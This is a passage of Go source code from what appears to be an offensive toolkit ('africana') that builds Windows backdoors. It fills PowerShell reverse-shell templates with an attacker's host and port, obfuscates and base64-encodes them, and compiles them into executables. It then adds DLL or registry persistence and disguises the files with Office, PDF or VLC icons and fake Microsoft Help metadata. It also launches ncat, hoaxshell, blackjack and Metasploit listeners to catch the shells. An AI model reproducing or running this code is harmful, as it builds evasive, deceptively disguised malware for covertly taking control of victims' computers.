        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -p %s", ToolsDir, Lhost, Lport)
        fmt.Println()
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func BlackJack(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -n %s\n", ToolsDir, Lport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -x %s -n %s", ToolsDir, Lport, Hport)
        fmt.Println()
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Ncat(Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, Lport)
    case "https", "http":
         fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-key %s/africana-key.pem --ssl-cert %s/africana-cert.pem -lnvp %s`, CertDir, CertDir, Lport)
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Metasploit(Lhost string, Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func ShikataGanai(ToolsDir string, Lport string, Hport string, Protocol string, Script string, C2 string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nPROTOCOL => %s\nC2 => %s\n", Lhost, Lport, Hport, Icon, Protocol, C2)
    switch strings.ToLower(Protocol) {
    case "tcp":
        src := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1")
        dst := filepath.Join(OutPutDir, "powershell_reverse_tcp.txt")

        if err := utils.Copy(src, dst); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Println("Copy succeeded!")
        }

        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }

        fmt.Println(); utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_tcp.txt`
        Obfuscated := `/root/.afr3/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, Obfuscated)

        encoded, err := utils.EncodeFileToPowerShellEncodedCommand(Obfuscated)
        if err != nil {
            fmt.Fprintf(os.Stderr, "Error encoding file: %v\n", err)
            return
        }

        src1 := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/go_exploits/malware_complete.go")
        dst1 := filepath.Join(OutPutDir, "malware_complete.go")

        if err := utils.Copy(src1, dst1); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Println("Copy succeeded!")
        }

        Replacement := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }

        fmt.Println(); utils.Editors(Replacement)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -enc %s\n", bcolors.Yellow, bcolors.Blue, bcolors.Endc, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.Yellow, bcolors.Blue, bcolors.Endc)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    case "http", "https":
        src := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/ncat_exploits/powershell_reverse_http.ps1")
        dst := filepath.Join(OutPutDir, "/powershell_reverse_http.txt")

        if err := utils.Copy(src, dst); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Println("Copy succeeded!")
        }

        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_http.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }

        fmt.Println(); utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_http.txt`
        Obfuscated := `/root/.afr3/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, Obfuscated)

        encoded, err := utils.EncodeFileToPowerShellEncodedCommand(Obfuscated)
        if err != nil {
            fmt.Fprintf(os.Stderr, "Error encoding file: %v\n", err)
            return
        }

        src1 := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/go_exploits/malware_complete.go")
        dst1 := filepath.Join(OutPutDir, "malware_complete.go")

        if err := utils.Copy(src1, dst1); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Println("Copy succeeded!")
        }

        filesToReplace := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }

        fmt.Println(); utils.Editors(filesToReplace)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -enc %s\n", bcolors.Yellow, bcolors.Blue, bcolors.Endc, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.Yellow, bcolors.Blue, bcolors.Endc)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "LISTENER %s not found. Try help command ...", Protocol)
    }
}

func IconChanger(Icon string) {
    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "Disguising backdoor with %s icon ...\n", Icon)
    switch strings.ToLower(Icon) {
    case "lync":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "excel":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "access":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "autorun":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "pdf":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "project":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "publisher":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "powerpoint":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "rat":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "vlc":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "word":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "visio":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    default:
        utils.SystemShell(Input)
    }
}

 //dll persistence mechanisim//
func NoiseMakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)
    dllFilePath := "/root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.afr3/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    src := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/go_exploits/malware_runner_dll.go")
    dst := filepath.Join(OutPutDir, "malware_runner_dll.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Println("Copy succeeded!")
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_dll.go": {
        "africanas": encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_dll.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"

    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "hooking .exe with .dll for persistence ...\n")
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    IconChanger(Icon)
    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "Launching %sc2 ...", C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "LISTENER %s not found. Try help command ...", Protocol)
    }
    log.Printf(bcolors.Green + "\n[+] " + bcolors.Endc + "complete backdoor saved at: " + bcolors.Blue + "%s", endMalwarePath + bcolors.Endc)
}

//regestry persistence mechanisim//
func CodeBreakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)

    exeFilePath := "/root/.afr3/output/malware_complete.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    src := filepath.Join(ToolsDir, "exploits/windows/hoaxshells/payload_templates/go_exploits/malware_runner_reg.go")
    dst := filepath.Join(OutPutDir, "malware_runner_reg.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Println("Copy succeeded!")
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_reg.go": {
        "africanas": encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.Red + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_reg.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"
    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "hooking .exe with .dll for persistence ...\n")
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    IconChanger(Icon)

    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "Launching %s c2 ...", C2)

    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return  
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
    log.Printf(bcolors.Green + "\n[+] " + bcolors.Endc + "complete backdoor saved at: " + bcolors.Blue + "%s", endMalwarePath + bcolors.Endc)
}

func ListenerLauncher(C2 string, Lport string, Hport string, Protocol string) {
    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "Launching %s c2 ...", C2)

    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return  
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.Red + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}
